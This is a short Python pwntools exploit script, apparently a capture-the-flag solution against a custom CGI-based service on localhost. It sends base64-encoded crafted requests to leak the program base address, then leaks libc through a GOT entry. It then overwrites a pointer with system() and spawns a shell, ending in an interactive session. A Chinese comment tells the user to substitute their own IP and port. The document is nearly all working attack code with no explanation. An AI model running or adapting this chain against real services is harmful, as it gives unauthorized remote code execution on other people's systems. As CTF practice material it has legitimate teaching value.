#coding:utf-8
from pwn import *
import base64
import requests

context.log_level='debug'
# ip = "node4.buuoj.cn"
# port = 26254
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ip = '127.0.0.1'
port = 4000

p = remote(ip,port)
def packmsg(content):
    return "GET /submit.cgi?"+base64.b64encode(content)+" HTTP/1.0\r\n\r\n"


def code(op,agr1,agr2,agr3):
    return p32(op) + p64(agr1) + p64(agr2) + p64(agr3)


pay1 = code(0x66,4,0,0)
payload = p32(1)+pay1

msg = packmsg(payload)
p.send(msg)

p.recvuntil("Let us look. Oh! That is ")
base = int(p.recv(len('0x562bcd850070')),16) - 0x4070
print "[+]process_base==>"+hex(base)

p.close()

p = remote(ip,port)

tar_got = base + 0x60c0

pay = code(0x88,base,0x60c0,0)
payload = p32(1) + pay
msg = packmsg(payload)
p.send(msg)
p.recvuntil("Message: ")
libc_base = int(p.recv(len("0x7f9a180642c0")),16) - libc.sym['bind']
print "[+]libc_base==>"+hex(libc_base)


system = libc_base+libc.sym['system']
print "[+]system==>"+hex(system)

p.close()


p = remote(ip,port)
data = p32(2) + p32(0xf1) + p64(base) + p64(0x6048) + p64(system)
data += p32(0x22) + "ping".ljust(8, "\x00") + "sh" # 这里需要替换为自己的ip和端口
p.send(packmsg(data))
p.recvall(10)

p.interactive()